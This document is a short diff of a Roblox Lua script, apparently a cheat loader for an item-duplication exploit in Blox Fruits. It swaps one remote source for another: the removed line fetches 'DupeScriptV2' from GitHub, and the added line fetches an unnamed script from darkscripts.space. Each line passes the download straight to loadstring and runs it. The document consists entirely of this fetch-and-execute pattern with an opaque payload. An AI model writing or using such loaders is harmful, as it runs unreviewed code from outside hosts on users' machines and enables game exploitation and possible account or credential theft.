@@ -1,2 +1,1 @@
-wait("0.1")
-loadstring(game:HttpGet('https://raw.githubusercontent.com/BloxFruits222/Dupe/refs/heads/main/DupeScriptV2' ,true))()
+loadstring(game:HttpGet('https://darkscripts.space/scripts/190eddc3-7c2b-41dd-8cc3-6f946701df48_998094277890551909.lua',true))()
